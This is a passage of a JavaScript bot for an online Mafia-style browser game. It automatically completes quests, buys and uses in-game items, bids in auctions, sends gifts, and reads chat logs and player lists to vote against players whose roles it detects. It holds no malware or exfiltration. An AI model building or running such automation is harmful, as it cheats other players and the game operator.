								} else {
									
									setTimeout(() => countSendGift = 0, 3000);
									
								}

								allowRoom = false;

								break;

							case 79: 
							
								/**********Подарить меги**********/
							
								if (countSendMega < __dqs[quest].limits[i]) {

									_WND_proc('gifts', 'buy', {id: discountMegaGift, uid: giftsSendTo, txt: ''}, event);
									
									countSendMega++;
									
								} else {
									
									setTimeout(() => countSendMega = 0, 3000);
									
								}

								allowRoom = false;

								break;
								
							case 77: 
							
								/**********Сбить босса на главной странице**********/
							
								_DLG('boss', 2, event);
								
								allowRoom = false;
							
								break;

						}
					
					}

				});
				
				if (allowRoom) {
					
					myExtraCount = {};
					
					$('#gxt_list li').each((i, val) => {

						myExtraCount[parseInt($(val).attr('id').replace(/\D+/g, ''))] = parseInt($(val).find('span').text());

					});
					
					if (priorityUsersCountRoom != usersCountRoom && priorityUsersCountRoom > 8) {
					
						usersCountRoom = priorityUsersCountRoom;
					
					}
					
					EnterTheRoom(usersCountRoom, uLeague);
					
				}
				
			}
			
			break;
			
		case 'room':
		
			$.each(my_quests, (i, quest) => {
				
				if (!activeTasks[i]) return true;
				
				questsFinish[quest] = ([81, 79, 77, 50, 49, 48, 47, 46, 45, 44, 43, 42, 20].includes(quest)) ? 1 : 0;
					
				switch (quest) {
				
					case 76: 
					
						/**********Проверка и покупка обычных экстр**********/
					
						$.each(minCountExtBuy, (key, val) => {
							
							let countExtra = myExtraCount[key];
							
							countExtra = countExtra ? parseInt(countExtra) : 0;
							
							if (countExtra < val) {

								extraBuy(key);
								
								myExtraCount[key] = countExtra + 1;
								
							}
							
						});

						break;
						
					case 75: 
					
						/**********Проверка и покупка клановых экстр**********/
					
						$.each(minCountClanExtBuy, (key, val) => {
							
							let countExtra = myExtraCount[key];
							
							countExtra = countExtra ? parseInt(countExtra) : 0;
							
							if (countExtra < val) {

								extraBuy(key);
								
								myExtraCount[key] = countExtra + 1;
								
							}
							
						});
					
						break;
						
					case 74:
					
					case 73:
					
					case 72:

					case 71:
					
					case 70:
					
					case 67:
					
					case 66:
					
					case 65:
					
					case 62:
					
					case 61:
					
					case 60:
					
					case 58:
					
					case 55:
					
					case 54:
					
					case 52:
							
						let countExtra = myExtraCount[questExtCount[quest][0]];
						
						countExtra = countExtra ? parseInt(countExtra) : 0;
						
						if (countExtra < questExtCount[quest][1]) {

							extraBuy(questExtCount[quest][0]);
							
							myExtraCount[questExtCount[quest][0]] = countExtra + 1;
							
						}
					
						break;						
				
				}
					
			});
				
			if ($('#auctionPopup').length) {
				
				if (my_quests.includes(auctionRolesSuik[gam_data['sale_p']]) || my_quests.includes(49)) {

					if (rolesRuby && parseInt($('.rubyBalance').text())) {
						
						_GM_action('', 'sale_bet', 2, event);
						
					} else if (gam_data['sale_t'] < 3 && gam_data['sale_b'] < 500) {
						
						_GM_action('', 'sale_bet', 0);
						
					}

				} else if (my_quests.includes(auctionRolesWin[gam_data['sale_p']])) {
					
					if (rolesRuby && parseInt($('.rubyBalance').text())) {

						_GM_action('', 'sale_bet', 2, event);
						
					} else if (gam_data['sale_t'] < 3 && gam_data['sale_b'] < 500) {

						_GM_action('', 'sale_bet', 0);
						
					}
					
				} else if (my_quests.includes(50) && gam_data['sale_b'] < 20) {
					
					_GM_action('', 'sale_bet', 0);

				}
			
			}

			break;

		case 'game':
		
			$.each(my_quests, (i, quest) => {
				
				if (!activeTasks[i] || questsFinish[quest]) return true;
				
				let autosuik = false;
				
				if (__dqs[quest].limits[i] > my_quests_limit[i]) {
			
					switch (quest) {
						
						case 1:
						
							questsFinish[quest] = (!__team_by_person(pla_data['person'])) ? 1 : 0;

							break;
							
						case 2:
						
							questsFinish[quest] = (pla_data['person'] != 2 && pla_data['person'] != 9 && pla_data['person'] != 25 && pla_data['person'] != 47) ? 1 : 0;

							break;
							
						case 3:
						
							questsFinish[quest] = (!__team_by_person(pla_data['person'])) ? 1 : 0;

							break;
							
						case 4:
						
							questsFinish[quest] = (__team_by_person(pla_data['person'])) ? 1 : 0;

							break;
							
						case 5:
						
							questsFinish[quest] = (pla_data['person'] == 3) ? 1 : 0;

							break;
							
						case 6:
						
						case 7:
						
						case 8:
						
						case 9:
						
						case 10:
						
						case 11:
						
							questsFinish[quest] = 0;

							break;
							
						case 12:
						
							questsFinish[quest] = (pla_data['person'] != 1) ? 1 : 0;

							break;
							
						case 13:
						
							questsFinish[quest] = (pla_data['person'] != 4) ? 1 : 0;

							break;
							
						case 14:
						
							questsFinish[quest] = (pla_data['person'] != 6) ? 1 : 0;

							break;
							
						case 15:
						
							questsFinish[quest] = (pla_data['person'] != 10 && pla_data['person'] != 11) ? 1 : 0;

							break;
							
						case 16:
						
							questsFinish[quest] = (pla_data['person'] != 12) ? 1 : 0;

							break;
							
						case 17:
						
							questsFinish[quest] = (pla_data['person'] != 2) ? 1 : 0;

							break;
							
						case 18:
						
							questsFinish[quest] = (pla_data['person'] != 9) ? 1 : 0;

							break;
							
						case 19:
						
							questsFinish[quest] = (pla_data['person'] != 25) ? 1 : 0;

							break;
							
						case 20:
						
							questsFinish[quest] = (pla_data['person'] != 3) ? 1 : 0;

							break;
							
						case 21:
						
							questsFinish[quest] = 0;

							break;
							
						case 22:
						
							questsFinish[quest] = 0;

							break;
							
						case 24:
						
							questsFinish[quest] = (pla_data['person'] != 25) ? 1 : 0;

							break;
							
						case 25:
						
							questsFinish[quest] = (pla_data['person'] != 2) ? 1 : 0;

							break;
							
						case 26:
						
							questsFinish[quest] = (pla_data['person'] != 3) ? 1 : 0;

							break;
							
						case 27:
						
							questsFinish[quest] = (pla_data['person'] != 9) ? 1 : 0;

							break;
							
						case 28:
						
							questsFinish[quest] = (pla_data['person'] != 9) ? 1 : 0;

							break;
							
						case 29:
						
							questsFinish[quest] = (pla_data['person'] != 4) ? 1 : 0;

							break;
							
						case 30:
						
							questsFinish[quest] = (pla_data['person'] != 6) ? 1 : 0;

							break;
							
						case 31:
						
							questsFinish[quest] = (pla_data['person'] != 10 && pla_data['person'] != 11) ? 1 : 0;

							break;
							
						case 32:
						
							questsFinish[quest] = (pla_data['person'] != 12) ? 1 : 0;

							break;

						case 33:
						
							questsFinish[quest] = (pla_data['person'] != 25) ? 1 : 0;

							break;
							
						case 34:
						
							questsFinish[quest] = 0;

							break;
							
						case 35:
						
							questsFinish[quest] = 0;

							break;
							
						case 41:
						
							questsFinish[quest] = 0;

							break;

						case 52: 
						
							/**********Жучок**********/
						
							if (!gam_data['v_mode']) {
						
								questsEnd = (parseInt($('#gxt_101').not('.disabled').find('.count').text())) ? useExtra([101]) : true;
								
								questsFinish[quest] = listQuests[1].includes(quest) ? 1 : 0;
								
							}
								
							break;
						
						case 54: 
						
							/**********Детектор лжи**********/
						
							questsEnd = (parseInt($('#gxt_104').not('.disabled').find('.count').text())) ? useExtra([104]) : true;
							
							questsFinish[quest] = listQuests[1].includes(quest) ? 1 : 0;
								
							break;
						
						case 55: 
						
							/**********Двойной голос**********/
						
							if (gam_data['v_mode']) {
								
								vote(randomPlayer($('#upl_list li .ico[title=""]').not('.idead').parent()));

								questsEnd = (parseInt($('#gxt_103').not('.disabled').find('.count').text())) ? useExtra([103]) : true;
								
								if (questsEnd) {
								
									questsFinish[quest] = 1;
									
								}
								
							}

							break;
						
						case 60: 
						
							/**********Револьвер**********/
						
							questsEnd = (parseInt($('#gxt_105').not('.disabled').find('.count').text())) ? useExtra([105]) : true;
							
							if (questsEnd) {
								
								questsFinish[quest] = 1;
								
							}
								
							break;
						
						case 61:
						
							/**********Психоз**********/
						
							if (gam_data['v_mode']) {
								
								questsEnd = (parseInt($('#gxt_114').not('.disabled').find('.count').text())) ? useExtra([114]) : true;
								
							}
							
							if (questsEnd) {	
								
								questsFinish[quest] = 1;
								
							}

							break;

						case 62:
						
							/**********Киллер**********/
						
							if (!questKiller) {
								
								userKiller = $('#upl_list li .ico[title=""]').not('.idead').parent();
								
								questKiller = true;								
								
								$.each(my_quests, (i, value) => {
								
									if (!activeTasks[i] || questsFinish[value]) return true;

									if (questsPriority.includes(value)) {
									
										questKiller = false;
										
									}
								
								});
								
								if (questKiller) {

									_DLG('exit', 2, event);
									
								}

								
							}
							
							if (questKiller) {

								questsEnd = (parseInt($('#gxt_115').not('.disabled').find('.count').text())) ? useExtra([115], userKiller) : true;
								
								if (questsEnd) {
									
									questsFinish[quest] = 1;
									
									_DLG('exit', 2, event);
									
								}
							
							}

							break;

						case 65: 
						
							/**********Исповедь**********/

							questsEnd = (parseInt($('#gxt_155').not('.disabled').find('.count').text())) ? useExtra([155]) : true;
							
							if (questsEnd) {
								
								questsFinish[quest] = 1;
								
							}							

							break;
						
						case 66: 
						
							/**********Карты таро**********/
						
							questsEnd = (parseInt($('#gxt_156').not('.disabled').find('.count').text())) ? useExtra([156]) : true;
							
							if (questsEnd) {
								
								questsFinish[quest] = 1;
								
							}

							break;						
						
						case 67: 
						
							/**********Бюрократ**********/
						
							if (gam_data['v_mode']) {

								questsEnd = (parseInt($('#gxt_157').not('.disabled').find('.count').text())) ? useExtra([157]) : true;
								
							}
							
							break;						
						
						case 70: 
						
							/**********Таблетки**********/
						
							if (!gam_data['v_mode']) {

								questsEnd = (parseInt($('#gxt_170').not('.disabled').find('.count').text())) ? useExtra([170]) : true;
							
							}
							
							if (questsEnd) {
								
								questsFinish[quest] = 1;
								
							}					

							break;
						
						case 71: 
						
							/**********Автомат**********/
						
							questsEnd = (parseInt($('#gxt_159').not('.disabled').find('.count').text())) ? useExtra([159]) : true;
							
							if (questsEnd) {
								
								questsFinish[quest] = 1;
								
							}
							
							break;

						
						case 72: 
						
							/**********Карты таро на мафию**********/
						
							if (gam_data["v_left"][2] || gam_data["v_left"][9] || gam_data["v_left"][25] || gam_data["v_left"][47]) {
								
								taroMaf = 1;

							} else {
								
								questsFinish[quest] = 1;
								
							}

							break;
							
						case 73: 
						
							/**********Карты таро на маньяка**********/
						
							if (gam_data["v_left"][3]) {
								
								taroMan = 1;

							} else {
								
								questsFinish[quest] = 1;
								
							}

							break;

						case 74: 
						
							/**********Автомат свинец на мафию**********/ 
						
							if (gam_data["v_left"][2] || gam_data["v_left"][9] || gam_data["v_left"][25] || gam_data["v_left"][47]) {

								questsEnd = (parseInt($('#gxt_159').not('.disabled').find('.count').text())) ? useExtra([159]) : true;
								
								if (questsEnd) {
									
									questsFinish[quest] = 1;
									
								}
							
							} else {
								
								questsFinish[quest] = 1;
								
							}

							break;
							
						case 75: 
						
							/**********Использование клановых экстр**********/
						
							switch (i) {
								
								case 0: 
								
									/**********Только таро и исповедь**********/

									if (parseInt($('#gxt_155').not('.disabled').find('.count').text())) {

										useExtra([155]);

									} else if (parseInt($('#gxt_156').not('.disabled').find('.count').text())) {

										useExtra([156]); 
										
									} else {
										
										questsFinish[quest] = 1;
										
									}
								
									break;

								case 1:  
								
									/**********Карты таро, исповедь, таблетки и один автомат**********/
								
									if (parseInt($('#gxt_155').not('.disabled').find('.count').text()) || parseInt($('#gxt_156').not('.disabled').find('.count').text()) || parseInt($('#gxt_170').not('.disabled').find('.count').text())) {

										useExtra([170, 155, 156]);

									} else {

										useExtra([159]);
										
										questsFinish[quest] = 1;
										
									}
								
									break;
									
								case 2:

									/**********Карты таро, исповедь, таблетки**********/
								
									if (parseInt($('#gxt_155').not('.disabled').find('.count').text()) || parseInt($('#gxt_156').not('.disabled').find('.count').text())) {

										useExtra([155, 156]);
										
									} else if (parseInt($('#gxt_170').not('.disabled').find('.count').text())) {
										
										useExtra([170]);

										questsFinish[quest] = 1;

									}
								
									break;
							
							}

							break;
							
						case 76: 
						
							/**********Использование обычных экстр**********/
						
							gam_data['v_mode'] ? useExtra([103, 114]) : useExtra([101, 104]);
							
							if (pla_data["e103"] && pla_data["e114"] && listQuests[1].includes(quest)) {
								
								questsFinish[quest] = 1;

							}
							
							//questsEnd = (gam_data['v_mode'] && questsEnd) ? true : false;

							break;

					}
					
					if (questsFinish[quest] && activeTasks[i] == 2 && listQuests[1].includes(quest)) {
						
						botExit(my_quests);
						
					}
				
				} else {
					
					questsFinish[quest] = 1;
					
					if (quest == 62) {
						
						questKiller = false;
						
					}
					
					//questsEnd = true; 
					
				}

			});
			
			let suikExit = 1;
			
			let optionSuikYes = 0;
			
			for (var q in questsFinish) {
				
				q = parseInt(q);

				if (!questsFinish[q]) {

					suikExit = 0;
					
				}
				
				if (listQuests[1].includes(q)) {
				
					optionSuikYes = 1;
				
				}
				
			}
			
			if ($('.my.idead').length || $('#pp_fin').length || (suikExit && optionSuikYes)) {

				botExit(my_quests);

			}
			
			readExtraResult();

			readProva();
			
			readSMS();
			
			readUserList();
			
			if (pla_data['kvt']) {
				
				judgment();
				
			}

			break;

		case 'fin':

			botExit(my_quests);

			break;

	}

}

spouse();

discount();

const readSMS = () => {
	
	if ($('#cco_log p').length) {

		$('#cco_log p').each((n, sms) => {
			
			for (let key in extraTextProva) {
				
				key = parseInt(key);

				if ($(sms).text().includes(extraTextProva[key])) {
					
					let prov;
					
					switch (key) {
						
						case 155:
						
						case 239:
						
							prov = $(sms).text().replace(extraTextProva[key], '').split(' - ');
						
							break;
							
						default:
						
							prov = $(sms).text().split(extraTextProva[key]).pop().split(' - ');
						
							break;
							
					}
					
					let provaNick = prov[0];
					
					let provaRole = prov[1];

					let provaId = userList(1, provaNick);
					
					if (provaId && !pla_data['kvt']) {
						
						setTimeout(() => gam_data['v_mode'] ? runBot(2, provaId, provaNick, provaRole) : false, 3000);
						
					}				
					
				}

			}		
			
		});
	
	}
	
}

const readExtraResult = () => {

	if ($('#cco_log .extra .text').length) {
	
		$('#cco_log .extra .text').each((n, prova) => {
			
			let extraId = parseInt($(prova).parent().find('img').attr('src').replace(/\D+/g,""));
	
			if (extraTextProva[extraId]) {
				
				try {
				
					let prov;
					
					switch (extraId) {
						
						case 155:
						
						case 239:
						
							prov = $(prova).text().replace(extraTextProva[extraId], '').split(' - ');
						
							break;
							
						default:
						
							prov = $(prova).text().split(extraTextProva[extraId]).pop().split(' - ');
						
							break;
							
					}
				
					let provaNick = prov[0];
					
					let provaRole = prov[1].replace('Рассказать ', '');

					let provaId = userList(1, provaNick);
					
					if (provaId && !pla_data['kvt']) {
						
						setTimeout(() => gam_data['v_mode'] ? runBot(2, provaId, provaNick, provaRole) : false, 3000);
						
					}
				
				} catch(error) {
					
					console.info($(prova).text(), extraTextProva[extraId]);
					
				}
			
			}
			
		});
	
	}
	
}

const runBot = (param, id, nick, role) => {
	
	let questsEnd;

	switch (param) {
		
		/**********Голос по прове**********/
		
		case 1:
		
			switch (role) {
				
				case 'маньяка':
				
					if (pla_data['person'] != 3) {
						
						if (taroMan) {

							questsEnd = (parseInt($('#gxt_156').not('.disabled').find('.count').text())) ? useExtra([156], false, id) : true;
						
							if (questsEnd) {
							
								questsFinish[73] = 1;
							
							}
							
						}
						
						if (!pla_data["act"] && gam_data['v_mode']) {
						
							_GM_action('', 'vote', 2, [id, 0]);
							
						}
						
						prigUsers[id] = 1;
						
					}
				
					break;
				
				case 'мафию':
				
					if (taroMaf) {

						questsEnd = (parseInt($('#gxt_156').not('.disabled').find('.count').text())) ? useExtra([156], false, id) : true;
					
						if (questsEnd) {
						
							questsFinish[72] = 1;
						
						}
						
					}
				
					if (![2, 9, 25, 47].includes(pla_data['person'])) {
						
						if (!pla_data["act"] && gam_data['v_mode']) {
						
							_GM_action('', 'vote', 2, [id, 0]);
							
						}
						
						prigUsers[id] = 1;
						
					}
				
					break;
					
				case 'Братьев Бандитос':
				
					if (![21, 24, 43].includes(pla_data['person'])) {
						
						if (!pla_data["act"] && gam_data['v_mode']) {
						
							_GM_action('', 'vote', 2, [id, 0]);
							
						}
						
						prigUsers[id] = 1;
						
					}
				
					break;
					
				case 'граждан':
				
					prigUsers[id] = __team_by_person(pla_data['person']) ? 0 : 1;

					break;

			}		 

			break;
			
		/**********Голос по экстрам**********/
		
		case 2:
		
			switch (role) {
				
				case 'Маньяк':
				
					if (pla_data['person'] != 3) {
						
						if (taroMan) {

							questsEnd = (parseInt($('#gxt_156').not('.disabled').find('.count').text())) ? useExtra([156], false, id) : true;
						
							if (questsEnd) {
							
								questsFinish[73] = 1;
							
							}
							
						}
						
						if (!pla_data["act"] && gam_data['v_mode']) {
						
							_GM_action('', 'vote', 2, [id, 0]);
							
						}
						
						prigUsers[id] = 1;
						
					}
				
					break;
				
				case 'Мафиози':
				
				case 'Босс мафии':
				
				case 'Двуликий':
				
				case 'Продажный полицейский':
				
					if (taroMaf) {

						questsEnd = (parseInt($('#gxt_156').not('.disabled').find('.count').text())) ? useExtra([156], false, id) : true;
					
						if (questsEnd) {
						
							questsFinish[72] = 1;
						
						}
						
					}
				
					if (![2, 9, 25, 47].includes(pla_data['person'])) {
						
						if (!pla_data["act"] && gam_data['v_mode']) {
						
							_GM_action('', 'vote', 2, [id, 0]);
							
						}
						
						prigUsers[id] = 1;
						
					}
				
					break;
					
				case 'Санчо':
				
				case 'Мигель':
				
				case 'Бандит':
				
					if (![21, 24, 43].includes(pla_data['person'])) {
						
						if (!pla_data["act"] && gam_data['v_mode']) {
						
							_GM_action('', 'vote', 2, [id, 0]);
							
						}
						
						prigUsers[id] = 1;
						
					}
				
					break;
					
				default:
				
					prigUsers[id] = __team_by_person(pla_data['person']) ? 0 : 1;

					break;

			}		 

			break;
			
		/**********Голос по роли**********/
		
		case 3:
		
			if (!pla_data["act"] && gam_data['v_mode']) {
		
				_GM_action('', 'vote', 2, [id, 0]);
				
			}
			
			prigUsers[id] = 1;
		
			break;
		
	}
	
}

const readProva = () => {
	
	if ($('#cco_log .proverka').length) {
	
		$('#cco_log .proverka').each((n, prova) => {
			
			let prov = $(prova).text().split('сообщает: ').pop().split(' играет за ');
			
			let provaNick = prov[0];
			
			let provaRole = prov[1];
			
			let provaId = userList(1, provaNick);
			
			if (provaId) {
				
				setTimeout(() => gam_data['v_mode'] ? runBot(1, provaId, provaNick, provaRole) : false, 3000);
				
			}
			
		});
	
	}

}

const readUserList = () => {
	
	let urlList = $('#upl_list li .ico[title!=""]').not('.idead').parent();
	
	let questsEnd;
	
	if (urlList.length) {
		
		urlList.each((n, person) => {
			
			let personId = parseInt($(person).attr('id').replace(/\D+/g,""));
			
			if (personId == my_id) return true;
			
			let roleId = parseInt($(person).find('.ico').attr('label'));
			
			for (let key in personSquad) {
			
				if (personSquad[key].includes(roleId) && !personSquad[key].includes(pla_data['person'])) {
					
					prigUsers[personId] = 1;
					
					if (roleId == 3 && taroMan) {
						
						questsEnd = (parseInt($('#gxt_156').not('.disabled').find('.count').text())) ? useExtra([156], false, personId) : true;
					
						if (questsEnd) {
						
							questsFinish[73] = 1;
						
						}				
						
					}
					
					if ([2, 9, 25, 47].includes(roleId) && taroMaf) {
						
						questsEnd = (parseInt($('#gxt_156').not('.disabled').find('.count').text())) ? useExtra([156], false, personId) : true;
					
						if (questsEnd) {
						
							questsFinish[72] = 1;
						
						}							
						
					}
					
					setTimeout(() => gam_data['v_mode'] ? runBot(3, personId) : false, 3000);
					
					return false;
					
				}

			}
			
		});
	
	}

}

const judgment = () => {

	prigUsers[pla_data['kvt']] ? _GM_action('', 'vote', 2, [pla_data['kvt'], 0]) : _GM_action('', 'vote', 1, [pla_data['kvt'], 0]);

}

const nightRun = () => {

	

}

const userList = (param, value) => {
	
	let result = 0;
	
	let urlList = $('#upl_list li .ico').not('.idead').parent();
	
	urlList.each((n, line) => {
	
		switch (param) {
			
			/**********ID игрока**********/
			
			case 1:
				
				if ($(line).find('.nick').text() == value) {
					
					result = line.id.replace(/\D+/g, "");
					
					return false;
					
				}
			
				break;
		}
	
	});
	
	return result;
	
}

const startTimer = () => {

	if (botStart) {
		
		rewardActualQuests();
	
	}

};

let timer = setInterval(startTimer, speedSetInterval);
